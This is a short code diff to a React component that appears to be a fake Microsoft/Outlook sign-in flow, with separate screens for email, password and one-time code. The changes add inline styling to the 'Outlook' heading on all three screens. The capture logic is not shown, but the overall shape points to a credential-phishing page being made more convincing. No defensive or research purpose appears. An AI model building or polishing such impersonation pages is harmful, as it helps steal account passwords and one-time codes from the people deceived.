@@ -486,7 +486,7 @@ useEffect(() => {
 {currentView === 'ms-email' && (
   <div className="ms-container">
     <div className="ms-card"> 
-      <h1> {provider === 'outlook' ? 'Outlook' : ''} </h1>
+      <h1 style={{fontSize: '22px', marginBottom: '8px', textAlign:'center'}}> {provider === 'outlook' ? 'Outlook' : ''} </h1>
       <div className="ms-logo">
         <div className="ms-logo-icon">
           <div className="ms-logo-squares">     
@@ -536,7 +536,7 @@ useEffect(() => {
       {currentView === 'ms-password' && (
         <div className="ms-container">
           <div className="ms-card"> 
-            <h1> {provider === 'outlook' ? 'Outlook' : ''} </h1>
+            <h1 style={{fontSize: '22px', marginBottom: '8px', textAlign:'center'}}> {provider === 'outlook' ? 'Outlook' : ''} </h1>
             <div className="ms-logo">
               <div className="ms-logo-icon">
                 <div className="ms-logo-squares">
@@ -587,7 +587,7 @@ useEffect(() => {
       {currentView === 'ms-otp' && (
         <div className="ms-container">
           <div className="ms-card"> 
-            <h1> {provider === 'outlook' ? 'Outlook' : ''} </h1>
+             <h1 style={{fontSize: '22px', marginBottom: '8px', textAlign:'center'}}> {provider === 'outlook' ? 'Outlook' : ''} </h1>
             <div className="ms-logo">
               <div className="ms-logo-icon">
                 <div className="ms-logo-squares">
